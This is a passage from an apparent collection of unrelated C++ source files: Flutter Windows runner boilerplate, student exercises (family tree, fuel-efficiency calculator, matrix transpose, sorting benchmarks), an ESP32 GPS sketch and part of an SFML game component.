\"NAN\";\r\n        }\r\n    }\r\n\r\n    vector<Person*> returnChildren(){ //NOTE: SINCE CAN BE nullptr, CANNOT JUST USE this->_children\r\n        if (this != nullptr) {\r\n            return this->_children;\r\n        } else {\r\n            return {};\r\n        }\r\n    }\r\n\r\n    Person* getChild(string name){ //BFS same as isChild, just return object instead of bool\r\n        for (Person* p : this->returnChildren()){\r\n            if (p->returnName() == name)\r\n                return p;\r\n        }\r\n        return nullptr;\r\n    }\r\n\r\n    // Person* getNthChild(string name){ //BFS or DFS to see if a person if part of the parent's lineage\r\n    //     while (this->returnChildren() != {}){\r\n\r\n    //     }\r\n    //     return nullptr;\r\n    // }\r\n\r\n    // Person* getParent(Person* head){ //get Parent of specific entity. Need to start from head since it's single linked list\r\n    //     if (this == head) //cannot be parent if you are yourself the root. If you're not the root then you must be someone's child\r\n    //         return nullptr;\r\n\r\n    //     Person* p = head;\r\n    //     while (p->returnChildren()!={})\r\n    //     {\r\n    //         if(p->isChild(this->returnName())) //if i am the child of the current entity, then this entity is my parent\r\n    //             return p;\r\n    //     }\r\n    // }\r\n    #pragma endregion\r\n\r\n    #pragma region checkers\r\n    bool isChild(string name){ //O(n). BFS :) same as getChild, just return bool instead of object\r\n        for (Person* p : this->returnChildren()){\r\n            if (p->returnName() == name)\r\n                return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    bool isGrandChild(string name){//use isChild. DFS, O(n^2)\r\n        for (Person* p : this->returnChildren()){ //for every child of this entity\r\n            if (p->isChild(name)) //check if input is a child of the child iterated\r\n                return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    // bool isNthChild(string name, int n){ //DFS recursion of isChild\r\n    //     return false;\r\n    // } \r\n    #pragma endregion\r\n};\r\n\r\n#pragma region global functions\r\n//no need for it to be in Class (part of object) since no private var access needed. If in Class, it would be in the same format as PrintChildren\r\nvoid PrintTree(Person* head){ //BFS, should use PrintChildren\r\n    cout<<head->returnName()<<\": \";\r\n    // Person *p = head;\r\n    // While p.children is not empty{\r\n    //     cout<<p->name<<\", \";\r\n    // }\r\n    cout<<\"\\n\";\r\n}\r\n\r\nPerson* getPerson(Person* head, string name){ //BFS or DFS to see if a person is part of tree\r\n        if (head->returnName() ==name)\r\n            return head;\r\n\r\n        // while (this->returnChildren() != {}){\r\n\r\n        // }\r\n        return nullptr;\r\n    }\r\n\r\nbool Exists(Person *head, string name){\r\n    if (getPerson(head, name) ==nullptr)\r\n        return false;\r\n    return true;\r\n}\r\n#pragma endregion\r\n\r\nint main(){\r\n    //creating family tree ahmad->ali->edy\r\n ",
    "#include <iostream>\n#include <iomanip>\n#include <string>\n#include <limits>\n#include <cctype>\nusing namespace std;\n\ndouble calcMPG(double gallons, double miles);\n\nint main()\n{\n\tconst double MAX_GALS = 100;\n\tconst double MILES = 500;\n\tbool valid = true;\n\tdouble gallons = 0.0;\n\tdouble mpg = 0.0;\n\tstring carMake;\n\n\n\tcout << \"Enter the make of the car: \";\n\tgetline(cin, carMake);\n\n\tdo\n\t{\n\t\tcout << \"\\nEnter how many gallons of fuel were used: \";\n\t\tcin >> gallons;\n\n\t\tif (cin.fail() || gallons <= 0) // Check for invalid input in the form of characters or 0 or negative numbers\n\t\t{\n\t\t\tif (cin.fail())\n\t\t\t{\n\t\t\t\tcout << \"\\nPlease enter numbers and not characters.\\n\";\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"\\nInvalid input. Please enter a positive number.\\n\";\n\t\t\t}\n\t\t\tcin.clear(); // clear error flag\n\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n'); // ignore input in buffer until newline character\n\t\t\tvalid = false; // set flag to false to ensure do while loops again\n\t\t}\n\t\telse if (gallons > MAX_GALS)\n\t\t{\n\t\t\tcout << \"\\nThat seems like a very high amount. Are you sure? (y/n): \";\n\t\t\tchar confirm;\n\t\t\tcin >> confirm;\n\n\t\t\tif (tolower(confirm) == 'y')\n\t\t\t{\n\t\t\t\tvalid = true;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tvalid = false;\n\t\t\t\tcin.clear();\n\t\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tvalid = true; // set flag to true to exit loop\n\t\t}\n\t} while (!valid);\n\n\tmpg = calcMPG(gallons, MILES);\n\n\tcout << fixed << setprecision(2);\n\tcout << endl << \"During the 500 mile drive, the \" << carMake << \"'s fuel efficiency was \" << mpg << \" miles per gallon.\" << endl;\n\n\treturn 0;\n}\n\ndouble calcMPG(double gallons, double miles)\n{\n\treturn miles / gallons;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "\r\n#include <TinyGPSPlus.h>\r\n#include <HardwareSerial.h>\r\n\r\nHardwareSerial SerialPort(1); // use UART1\r\n\r\nTinyGPSPlus gps;\r\n\r\n\r\nvoid displayInfo()\r\n{\r\n  Serial.print(F(\"Location: \")); \r\n  if (gps.location.isValid())\r\n  {\r\n    Serial.print(gps.location.lat(), 6);\r\n    Serial.print(F(\",\"));\r\n    Serial.print(gps.location.lng(), 6);\r\n  }\r\n  else\r\n  {\r\n    Serial.print(F(\"INVALID\"));\r\n  }\r\n\r\n  Serial.print(F(\"  Date/Time: \"));\r\n  if (gps.date.isValid())\r\n  {\r\n    Serial.print(gps.date.month());\r\n    Serial.print(F(\"/\"));\r\n    Serial.print(gps.date.day());\r\n    Serial.print(F(\"/\"));\r\n    Serial.print(gps.date.year());\r\n  }\r\n  else\r\n  {\r\n    Serial.print(F(\"INVALID\"));\r\n  }\r\n\r\n  Serial.print(F(\" \"));\r\n  if (gps.time.isValid())\r\n  {\r\n    if (gps.time.hour() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.hour());\r\n    Serial.print(F(\":\"));\r\n    if (gps.time.minute() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.minute());\r\n    Serial.print(F(\":\"));\r\n    if (gps.time.second() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.second());\r\n    Serial.print(F(\".\"));\r\n    if (gps.time.centisecond() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.centisecond());\r\n  }\r\n  else\r\n  {\r\n    Serial.print(F(\"INVALID\"));\r\n  }\r\n\r\n  Serial.println();\r\n}\r\n\r\nvoid setup()\r\n{\r\n  Serial.begin(115200);\r\n  SerialPort.begin(9600, SERIAL_8N1, 9, 10); \r\n\r\n  while(!Serial);\r\n    Serial.println(\"Initializing\");\r\n\r\n  \r\n  delay(5000);\r\n  Serial.println(\"Test\");\r\n\r\n  SerialPort.println(\"$PMTK314,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0*29<CR><LF>\");\r\n\r\n  SerialPort.println(\"$PMTK220,100*2F<CR><LF>\");\r\n  //SerialPort.println(\"$PMTK251,115200*1F<CR><LF>\");\r\n\r\n  //SerialPort.begin(9600, SERIAL_8N1, 9, 10); \r\n  \r\n}\r\n\r\nvoid loop()\r\n{\r\n  // This sketch displays information every time a new sentence is correctly encoded.\r\n  while (SerialPort.available() > 0)\r\n    Serial.print(char(SerialPort.read()));\r\n    /*gps.encode(SerialPort.read());\r\n\r\n    \r\n    Serial.print(\"LAT=\"); Serial.print(gps.location.lat(), 6);\r\n    Serial.print(\" \");\r\n    Serial.print(\"LNG=\"); Serial.println(gps.location.lng(), 6);\r\n    Serial.println(gps.time.value());\r\n    Serial.println(\"\");\r\n    delay(1000);*/\r\n    \r\n\r\n  /*if (millis() > 5000 && gps.charsProcessed() < 10)\r\n  {\r\n    Serial.println(F(\"No GPS detected: check wiring.\"));\r\n    while(true);\r\n  }*/\r\n}\r\n\r\n",
    "#include <iostream>\nusing namespace std;\n\nint main() {\n    int a[10][10], transpose[10][10], row, column, i, j;\n\n    cout << \"Enter rows and columns of matrix: \";\n    cin >> row >> column;\n\n    cout << \"\\nEnter elements of matrix: \" << endl;\n\n    // Storing matrix elements\n    for (int i = 0; i < row; ++i) {\n        for (int j = 0; j < column; ++j) {\n            cout << \"Enter element a\" << i + 1 << j + 1 << \": \";\n            cin >> a[i][j];\n        }\n    }\n\n    // Printing the a matrix\n    cout << \"\\nEntered Matrix: \" << endl;\n    for (int i = 0; i < row; ++i) {\n        for (int j = 0; j < column; ++j) {\n            cout << \" \" << a[i][j];\n            if (j == column - 1)\n                cout << endl << endl;\n        }\n    }\n\n    // Computing transpose of the matrix\n    for (int i = 0; i < row; ++i)\n        for (int j = 0; j < column; ++j) {\n            transpose[j][i] = a[i][j];\n        }\n\n    // Printing the transpose\n    cout << \"\\nTranspose of Matrix: \" << endl;\n    for (int i = 0; i < column; ++i)\n        for (int j = 0; j < row; ++j) {\n            cout << \" \" << transpose[i][j];\n            if (j == row - 1)\n                cout << endl << endl;\n        }\n\n    return 0;\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <vector>\n#include <algorithm>\nusing std::cout;\nusing std::endl;\nusing std::swap;\nusing std::sort;\n\nusing std::clock_t;\nconst int CLOCKS_PER_MS = CLOCKS_PER_SEC/1000; // clock per milliseconds\n\nconst int NUMBERS_SIZE = 50000;\n\n// random number in range -> for test code\nint genRandInt(int low, int high) {\n   return low + rand() % (high - low + 1);\n}\n\n// fill arrays -> for test code\nvoid fillArrays(int arr1[], int arr2[],int arr3[]) {\n  for(int i = 0; i < NUMBERS_SIZE; ++i){\n    arr1[i] = genRandInt(0,NUMBERS_SIZE);\n    arr2[i] = arr1[i];\n    arr3[i] = arr1[i];\n  }\n}\n\n// helper for quicksorts\nint QPartition(int numbers[], int low, int high, int pivotIndex) {\n  int pivot = numbers[pivotIndex];\n  while (true) {  // continuously loops until fin is true\n    // until reaches element left of pivot that is greater than pivot value\n    while (numbers[low] < pivot) { ++low; }\n    // until reaches element right of pivot that is less than pivot value\n    while (pivot < numbers[high]) { --high; }\n    if (low >= high) break;  // checks if there are unsorted elements\n    // if continues, low index is still less than high index\n    swap(numbers[low], numbers[high]);\n    ++low;\n    --high;\n  }\n  return high;\n}\n\n// sorts given array in range using quicksort method, recursive\nvoid Quicksort_midpoint(int numbers[], int low, int high) {\n  if (low >= high) return;  // already sorted\n  int mid = (high - low) / 2 + low;\n  mid = QPartition(numbers, low, high, mid);  // call helper\n  Quicksort_midpoint(numbers, low, mid);  // left half recursive call\n  Quicksort_midpoint(numbers, mid + 1, high); // right half recursive call\n}\n\n// sort given array in range using quicksort method, but chooses pivot by\n// choosing middle value of low, middle, and high indexes, recursive\nvoid Quicksort_medianOfThree(int numbers[], int low, int high) {\n  if (low >= high) return;  // already sorted\n  int mid = (high - low) / 2 + low;\n  int pivot = mid;  // element at mid is pivot by default\n  // element at lowest index is middle value\n  if ((numbers[mid] < numbers[low] && numbers[low] < numbers[high]) ||\n      (numbers[high] < numbers[low] && numbers[low] < numbers[mid])) pivot = low;\n  // element at highest index is middle value\n  if ((numbers[mid] < numbers[high] && numbers[high] < numbers[low]) ||\n      (numbers[low] < numbers[high] && numbers[high] < numbers[mid])) pivot = high;\n  mid = QPartition(numbers, low, high, pivot);  // call helper\n  Quicksort_medianOfThree(numbers, low, mid); // left half recursive call\n  Quicksort_medianOfThree(numbers, mid + 1, high);  // right half recursive call\n}\n\n// sorts given array using insertion sort method\nvoid InsertionSort(int numbers[], int numbersSize) {\n  for (int i = 1; i < numbersSize; ++i) { // sorts every element in array\n    int j = i;\n    // shifts element left to correct spot\n    while (j > 0 && numbers[j] < numbers[j - 1]) {\n      swap(numbers[j], numbers[j - 1]);\n      --j;\n    }\n  }\n}\n\n// helper, returns true if sorted, else false\nstatic bool is_sorted(int numbers[], int numbersSize) {\n  if (numbersSize <= 0) return true;  // will be sorted if empty\n  int last = numbers[0];\n  for(int i=0; i < numbersSize; ++i) {  // checks all elements\n    int curr = numbers[i];\n    if (curr < last) return false;  // prev value is greater than curr -> not sorted properly\n    last = curr;\n  }\n  return true;\n}\n\n// put vector in array after randomizing in main\nstatic void copy_vector_into_array(const std::vector<int>& source, int array[]) {\n  for(int i=0;i<static_cast<int>(source.size()); ++i) { // iterate through vector\n    array[i] = source[i];\n  }\n}\n\nint main() {\n  std::vector<int> sample;\n  sample.reserve(NUMBERS_SIZE);\n  // randomize array\n  for(int i=0; i<NUMBERS_SIZE; ++i) {\n    sample.push_back(rand() % (NUMBERS_SIZE + 1));\n  }\n  \n  // run tests across different sizes\n  int test_sizes[4] = { 10, 100, 1000, 50000 };\n  int test_array[NUMBERS_SIZE];\n  for(int i=0; i<4; ++i) {  // loops for four different sizes\n    int size = test_sizes[i];\n    cout << endl;\n    cout << \"-------------------- size \" << size << \" --------------------\" << endl;\n\n    {\n      copy_vector_into_array(sample, test_array);\n      clock_t Start = clock();\n      Quicksort_midpoint(test_array, 0, size - 1);\n      clock_t End = clock();\n      int elapsedTime = (End - Start)/CLOCKS_PER_MS;\n      cout << elapsedTime << \" ms\" << endl;\n      cout << \"Quicksort midpoint is \" << ((is_sorted(test_array,size))?\"GOOD\":\"BAD\") << endl;\n    }\n    \n    // QUICKSORT MEDIAN OF THREE SORT\n    {\n      copy_vector_into_array(sample, test_array);\n      clock_t Start = clock();\n      Quicksort_medianOfThree(test_array, 0, size - 1);\n      clock_t End = clock();\n      int elapsedTime = (End - Start)/CLOCKS_PER_MS;\n      cout << elapsedTime << \" ms\" << endl;\n      cout << \"Quicksort median of three is \" << ((is_sorted(test_array,size))?\"GOOD\":\"BAD\") << endl;\n    }\n    \n    // INSERTION SORT\n    {\n      co",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"photo_gallery_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"news_app_ui_setup\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <SFML/Graphics.hpp>\n#include <SFML/Window.hpp>\n#include <SFML/System.hpp>\n#include <SFML/Audio.hpp>\n#include <SFML/Network.hpp>\n#include <iostream>\n#include <vector>\n#include <math.h>\n#include <cstdlib>\n#include <sstream>\n#include <fstream>\n#include <cmath>\n#include <string>\n#include <map>\n#include <stack>\n\n// LENGTH OF VECTOR: |V| = sqrt(V.x^2 + V.y^2)\n// NORMALIZE VECTOR: U = V / |V|\nusing namespace std;\nusing namespace sf;\n\nenum button_states\n{\n    BTN_IDLE = 0,\n    BTN_HOVER,\n    BTN_ACTIVE\n};\n\nenum movement_states\n{\n    IDLE = 0,\n    MOVING,\n    MOVING_LEFT,\n    MOVING_RIGHT,\n    MOVING_UP,\n    MOVING_DOWN\n};\nclass MovementComponent\n{ //============================  MovementComponent ====================================================\nprivate:\n    sf::Sprite *sprite;\n    float maxVelocity;\n    float acceleration;\n    float deceleration;\n\n    Vector2f velocity;\n\n    // initializer functions\n\npublic:\n    MovementComponent(sf::Sprite *sprit, float maxvelocity, float acceleration, float deceleration)\n        : sprite(sprit), maxVelocity(maxvelocity), acceleration(acceleration), deceleration(deceleration) {}\n    ~MovementComponent()\n    {\n    }\n    // Accessors\n    const float &getMaxVelocity() const\n    {\n        return this->maxVelocity;\n    }\n\n    const Vector2f &getVelocity() const\n    {\n        return this->velocity;\n    }\n\n    // functions\n\n    const bool getState(const short unsigned state) const\n    {\n        switch (state)\n        {\n        case IDLE:\n            if (this->velocity.x == 0.f && this->velocity.y == 0.f)\n            {\n                return true;\n            }\n            break;\n        case MOVING:\n            if (this->velocity.x != 0.f && this->velocity.y != 0.f)\n            {\n                return true;\n            }\n            break;\n        case MOVING_LEFT:\n            if (this->velocity.x < 0.f)\n            {\n                return true;\n            }\n            break;\n        case MOVING_RIGHT:\n            if (this->velocity.x > 0.f)\n            {\n                return true;\n            }\n            break;\n        case MOVING_UP:\n            if (this->velocity.y < 0.f)\n            {\n                return true;\n            }\n            break;\n        case MOVING_DOWN:\n            if (this->velocity.y > 0.f)\n            {\n                return true;\n            }\n            break;\n        }\n\n        false;\n    }\n    return false;\n}\n\nvoid\nmove(const float dir_x, const float dir_y, const float &dt)\n{\n    // Assclerating  a sprite untile reaches the max velocity\n    // Accecleration\n\n    this->velocity.x += this->maxVelocity * dir_x;\n    this->velocity.y += this->maxVelocity * dir_y;\n}\nvoid update(const float &dt)\n{\n    // Decelerate the sprite and controls the mamximum velocity.\n    // moves the sprite.\n    if (this->velocity.y > 0.f)\n    {\n        // Chack Max vlecity of positive y\n        if (this->velocity.y > this->maxVelocity)\n            this->velocity.y = this->maxVelocity;\n\n        // deceleration Y positive\n        this->velocity.y -= deceleration;\n        if (this->velocity.y < 0.f)\n            this->velocity.y = 0.f;\n    }\n    else if (this->velocity.y < 0.f)\n    {\n        // Chack Max vlecity of negitive y\n\n        if (this->velocity.y < -this->maxVelocity)\n            this->velocity.y = -this->maxVelocity;\n\n        // deceleration Y -VE\n        this->velocity.y += deceleration;\n        if (this->velocity.y > 0.f)\n            this->velocity.y = 0.f;\n    }\n\n    if (this->velocity.x > 0.f)\n    {\n        // Chack Max vlecity of positive x\n        if (this->velocity.x > this->maxVelocity)\n            this->velocity.x = this->maxVelocity;\n\n        // deceleration X positive\n        this->velocity.x -= deceleration;\n        if (this->velocity.x < 0.f)\n            this->velocity.x = 0.f;\n    }\n    else if (this->velocity.x < 0.f)\n    {\n        // Chack Max vlecity of negitive\n        if (this->velocity.x < -this->maxVelocity)\n            this->velocity.x = -this->maxVelocity;\n\n        // deceleration x -VE\n        this->velocity.x += deceleration;\n        if (this->velocity.x > 0.f)\n            this->velocity.x = 0.f;\n    }\n\n    // Final move\n    this->sprite->move(this->velocity * dt); // use this->velocity * dt to make it move at the same speed on all computers\n}\n\n;\n\nclass AnimationComponent\n{ //===========================  ANIMATION COMPONENT  ================================================\nprivate:\n    class Animation\n    { //===============================  Animation  ============================================================\n    public:\n        // Varibles\n        Texture &textureSheet;\n        Sprite &sprite;\n        float animationTimer;\n        float timer;\n        bool done;\n        float width;\n        float height;\n        IntRect startRectSourceSprite; //(235,0,108.33,164.75)\n        IntRect currentReack;\n        IntRect endRectSourceSprite;\n\n        // Contructor / Distructor\n        Animation(Sprite &sprite, Texture &texturSheet, float an",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
